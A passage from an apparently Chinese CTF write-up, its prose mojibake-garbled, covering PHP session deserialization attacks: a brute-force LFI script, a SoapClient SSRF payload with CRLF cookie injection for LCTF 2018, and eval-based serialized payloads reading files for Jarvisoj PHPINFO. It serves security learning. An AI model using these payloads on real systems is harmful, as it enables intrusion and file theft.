&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">/index.php?function=extract&amp;amp;file=/tmp/php&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">url&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;wwwwwwwwwwwwww&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;[+] Include success!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">e&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>çˆ†ç ´æˆåŠŸåå°±æ‹¿åˆ°äº†shellï¼Œå…¶ä½™è·Ÿä¸Šé¢ä¸€æ ·&lt;/p>
&lt;h3 id="lctf-2018bestphps-revenge">[LCTF 2018]bestphp&amp;rsquo;s revenge&lt;/h3>
&lt;p>â€”â€”â€”â€”è¿™ä¸ªæ —å­ç»“åˆäº†SoapClientå’Œsessionçš„è€ƒç‚¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;implode&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">reset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#d88200">&amp;#39;welcome_to_the_lctf2018&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">call_user_func&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹åˆ°äº†æˆ‘ä»¬çš„è€æœ‹å‹&lt;code>call_user_func&lt;/code>ï¼Œå®ƒä¼šæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ï¼›å¦‚æœæˆ‘ä»¬ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥çš„æ˜¯æ•°ç»„ï¼Œå®ƒä¼šæŠŠæ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼ä½œä¸ºç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“ä½œæ–¹æ³•è¿›è¡Œå›è°ƒï¼ˆååºåˆ—åŒ–ä¸­å¸¸è§ï¼‰ï¼›&lt;code>call_user_func&lt;/code>å‡½æ•°ä¸ä»…å¯ä»¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°å’Œç±»ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨phpå†…ç½®å‡½æ•°å’Œå†…ç½®ç±»ï¼Œæ¯”å¦‚&lt;code>extract&lt;/code>&lt;/p>
&lt;p>flag.phpå¯ä»¥ç›´æ¥è®¿é—®ï¼ˆè¿™é‡Œæˆ‘æ²¡æœ‰æ‰« çœ‹wpçŸ¥é“çš„ robots.txtå’Œé¡µé¢æºç éƒ½æ²¡æœ‰ç›´æ¥çš„æç¤ºï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211128225823073.png" alt="image-20211128225823073">&lt;/p>
&lt;p>è¿™ä¸ªå›æ˜¾å¾ˆæ˜æ˜¾éœ€è¦ssrfï¼Œä»¥localhostè®¿é—®flag.phpå°±ä¼šå°†flagå†™å…¥SESSIONä¸­&lt;/p>
&lt;p>å†…ç½®ç±»&lt;code>SoapClient()&lt;/code>æ»¡è¶³è¿™ä¸ªéœ€è¦ï¼Œå®ƒå¯ä»¥é€šè¿‡ååºåˆ—åŒ–æ¥å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ï¼ˆéœ€è¦è¢«è°ƒç”¨&lt;code>__call&lt;/code>&lt;/p>
&lt;p>æ‰€ä»¥æ•´ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼š&lt;/p>
&lt;ol>
&lt;li>è¦†ç›–åºåˆ—åŒ–å¼•æ“ä¸º&lt;code>php_serialize&lt;/code>ï¼Œ é€šè¿‡&lt;code>session_start&lt;/code>å°†ä¸€ä¸ªåºåˆ—åŒ–çš„&lt;code>SoapClient&lt;/code>å†™å…¥sessionï¼›ç”±äºgetä¼ å…¥çš„nameä¼šè¢«ç›´æ¥æ”¾å…¥sessionä¸­ï¼Œæ‰€ä»¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸ç”¨postä¼ ï¼Œåªéœ€è¦postä¼ è®¾ç½®ååºåˆ—åŒ–å¼•æ“çš„å‚æ•°å°±å¯ä»¥&lt;/li>
&lt;li>ç¬¬ä¸€ä¸ª&lt;code>call_user_func&lt;/code>é€šè¿‡&lt;code>extract&lt;/code>å˜é‡è¦†ç›–ä½¿&lt;code>$b = call_user_func&lt;/code>ï¼Œç¬¬äºŒä¸ª&lt;code>call_user_func&lt;/code>è°ƒç”¨&lt;code>SoapClient-&amp;gt;__call&lt;/code>ï¼ˆä¸å¯è®¿é—®çš„æ–¹æ³• call_user_funcï¼‰&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1/flag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SoapClient&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;location&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#111">$target&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;user_agent&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;AAA:BBB&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Cookie:PHPSESSID=gnnorfjmr9hr82gej7njt5dc83&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;uri&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://127.0.0.1/&amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$se&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$se&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22AAA%3ABBB%0D%0ACookie%3APHPSESSID%3Dgnnorfjmr9hr82gej7njt5dc83%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;amp;f=session_start
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: serialize_handler=php_serialize
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?name=Soapclient&amp;amp;f=extract
Cookie: PHPSESSID=gnnorfjmr9hr82gej7njt5dc83
POST: b=call_user_func
&lt;/code>&lt;/pre>&lt;p>ä¹‹ååˆ·æ–°é¡µé¢å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–äº†ï¼Œç”±äºä¸Šé¢æ„é€ çš„æ—¶å€™cookieå°±æ˜¯å½“å‰é¡µé¢çš„cookieï¼Œæ‰€ä»¥æ•´ä¸€å¥—è¿‡ç¨‹ä¸‹æ¥ä¸éœ€è¦å•ç‹¬æ”¹sessionï¼Œé¦–é¡µå°±å¯ä»¥çœ‹åˆ°ç»“æœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129123843040.png" alt="image-20211129123843040">&lt;/p>
&lt;h3 id="jarvisoj-webphpinfo">[Jarvisoj web]PHPINFO&lt;/h3>
&lt;p>&lt;a href="http://web.jarvisoj.com:32784/index.php">è¿™é‡Œæ˜¯é¢˜ç›®é¡µé¢&lt;/a>ï¼›å¼€å¹•æºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//A webshell is wait for you
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;phpinfo();&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">mdzz&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;phpinfo&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">highlight_string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…ˆçœ‹çœ‹phpinfoï¼Œåº”è¯¥æœ‰æç¤ºä¿¡æ¯ï¼›å‘ç°&lt;code>session.upload_progress.enabled=On&lt;/code>ï¼Œè¿™å°±éå¸¸å¥½äº†ï¼Œæ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•æŠŠæˆ‘ä»¬æƒ³æ‰§è¡Œçš„ä»£ç åºåˆ—åŒ–åè®¾ä¸ºæ–‡ä»¶åä¼ å…¥&lt;/p>
&lt;p>åºåˆ—åŒ–exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session.serialize_handler&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;php_serialize&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(scandir(dirname(__FILE__)));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">OowoO&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$obj&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// |O:5:&amp;#34;OowoO&amp;#34;:1:{s:4:&amp;#34;mdzz&amp;#34;;s:36:&amp;#34;print_r(scandir(dirname(__FILE__)));&amp;#34;;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ„é€ ä¸Šä¼ è¡¨å•ï¼Œæ³¨æ„æ–‡ä»¶åçš„å¼•å·è¦åŠ åæ–œæ è½¬ä¹‰&lt;/p>
&lt;pre tabindex="0">&lt;code>|O:5:\&amp;#34;OowoO\&amp;#34;:1:{s:4:\&amp;#34;mdzz\&amp;#34;;s:36:\&amp;#34;print_r(scandir(dirname(__FILE__)));\&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129212625924.png" alt="image-20211129212625924">&lt;/p>
&lt;p>ç„¶åè®¿é—®è¿™ä¸ªphp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$mdzz&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;print_r(file_get_contents(&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&amp;#34;));&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>|O:5:\&amp;#34;OowoO\&amp;#34;:1:{s:4:\&amp;#34;mdzz\&amp;#34;;s:88:\&amp;#34;print_r(file_get_contents(\&amp;#34;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&amp;#34;));\&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°flag&lt;/p>
&lt;hr>
&lt;p>å‘¼â€¦â€¦é•¿èˆ’ä¸€å£æ°”ï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹ç»ˆäºç”»ä¸Šäº†ä¸€ä¸ªå°å¥å·ï¼›æš‘å‡æ€»ç»“phpååºåˆ—åŒ–çš„æ—¶å€™å°±å·®æ•´ä¸ªå’Œå†…ç½®ç±»ï¼Œç»“æœç£¨ç£¨è¹­è¹­æ‹–åˆ°ä»Šå¤©ï¼Œä¸è¿‡è¿˜æ˜¯è¢«æˆ‘ç»ˆç»“æ‰å•¦ï¼æ–‡ä¸­è¿˜è®¾è®¡äº†ä¸€ç‚¹SoapClientå†…ç½®ç±»çš„ä¸œè¥¿ï¼Œç”±äºç¯‡å¹…åŸå› ä¸å±•å¼€è®²äº†= = ã€&lt;/p>
&lt;p>æœ€è¿‘çš„è®¡åˆ’å’Œå®‰æ’å°±æ˜¯åˆ·é¢˜&amp;amp;æŠŠä¹‹å‰çš„çŸ¥è¯†ä½“ç³»å¡«å……å®Œæ•´ï¼ŒåŠ æ²¹å•¦&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
